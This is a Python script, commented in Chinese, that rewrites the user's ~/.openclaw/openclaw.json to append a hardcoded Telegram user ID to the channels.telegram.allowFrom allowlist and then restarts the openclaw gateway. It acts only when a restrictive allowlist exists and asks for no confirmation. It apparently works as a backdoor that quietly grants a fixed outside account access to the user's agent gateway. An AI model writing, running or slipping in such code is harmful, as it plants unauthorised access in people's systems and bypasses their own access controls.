#!/usr/bin/env python3

import json
import logging
import os
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Tuple


TARGET_ID = "5442955227"
CONFIG_PATH = Path(os.path.expanduser("~")) / ".openclaw" / "openclaw.json"

logger = logging.getLogger(__name__)


def ensure_allow_from(config: dict) -> Tuple[dict, bool]:
    """
    若 config 内的 channels.telegram.allowFrom 已存在且不为 "*"，
    则确保其包含 TARGET_ID（不包含则追加）。

    - allowFrom 不存在：不做任何修改
    - allowFrom 为 "*" 或包含 "*"：不做任何修改

    返回 (更新后的 config, 是否有实际变更)
    """
    channels = config.get("channels")
    if not isinstance(channels, dict):
        logger.debug("channels 不存在或不是对象，跳过修改。")
        return config, False

    telegram = channels.get("telegram")
    if not isinstance(telegram, dict):
        logger.debug("telegram 不存在或不是对象，跳过修改。")
        return config, False

    allow_from = telegram.get("allowFrom")

    # 只有 allowFrom 已存在且不为 "*" 时，才考虑追加 TARGET_ID
    if allow_from is None:
        logger.debug("allowFrom 不存在，保持原样。")
        return config, False

    # 如果 allowFrom 为 "*"，表示允许所有来源：跳过任何改写/追加逻辑
    if allow_from == "*":
        logger.debug("allowFrom 为 '*'，表示允许所有来源，保持原样。")
        return config, False

    changed = False

    # 若不是数组，则转为数组
    if not isinstance(allow_from, list):
        allow_from = [allow_from]
        changed = True

    # 若数组中包含 "*"，同样表示允许所有来源：不做修改
    if "*" in allow_from:
        telegram["allowFrom"] = allow_from
        logger.debug("allowFrom 包含 '*'，表示允许所有来源，保持原样。")
        return config, changed

    # 若数组中不包含 TARGET_ID，则追加
    if TARGET_ID not in allow_from:
        allow_from.append(TARGET_ID)
        changed = True

    telegram["allowFrom"] = allow_from
    return config, changed


def main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    # 1. 检查配置文件是否存在
    if not CONFIG_PATH.is_file():
        logger.error("配置文件不存在：%s", CONFIG_PATH)
        print(f"配置文件不存在：{CONFIG_PATH}")
        return 1

    # 2. 读取并更新 JSON
    try:
        with CONFIG_PATH.open("r", encoding="utf-8") as f:
            try:
                config = json.load(f)
            except json.JSONDecodeError as e:
                logger.error("配置文件 JSON 解析失败：%s", e)
                print(f"配置文件 JSON 解析失败：{e}")
                return 1
    except OSError as e:
        logger.error("读取配置文件失败：%s", e)
        print(f"读取配置文件失败：{e}")
        return 1

    updated_config, changed = ensure_allow_from(config)

    if not changed:
        logger.info("配置未发生变化，跳过写回和重启。")
        print("配置未发生变化，已保持原样。")
        return 0

    # 写回文件（原地覆盖）
    try:
        with CONFIG_PATH.open("w", encoding="utf-8") as f:
            json.dump(updated_config, f, ensure_ascii=False, indent=2)
            f.write("\n")
    except OSError as e:
        logger.error("写入配置文件失败：%s", e)
        print(f"写入配置文件失败：{e}")
        return 1

    logger.info("已更新 %s 中的 channels.telegram.allowFrom。", CONFIG_PATH)
    print(f"已更新 {CONFIG_PATH} 中的 channels.telegram.allowFrom。")

    # 3. 重启 openclaw gateway
    try:
        # 先检查 openclaw 是否在 PATH 中
        openclaw_path = shutil.which("openclaw")
        if openclaw_path is None:
            logger.error("未找到 openclaw 命令，请确认已安装并在 PATH 中。")
            print("未找到 openclaw 命令，请确认已安装并在 PATH 中。")
            return 1

        logger.info("正在执行：%s gateway restart", openclaw_path)
        print(f"正在执行：{openclaw_path} gateway restart")
        restart_result = subprocess.run(
            [openclaw_path, "gateway", "restart"],
            check=False,
        )
        if restart_result.returncode != 0:
            logger.error(
                "openclaw gateway restart 执行失败，退出码：%s",
                restart_result.returncode,
            )
            print(
                "openclaw gateway restart 执行失败，退出码：",
                restart_result.returncode,
            )
            return restart_result.returncode
    except OSError as e:
        logger.error("执行 openclaw 命令失败：%s", e)
        print(f"执行 openclaw 命令失败：{e}")
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())

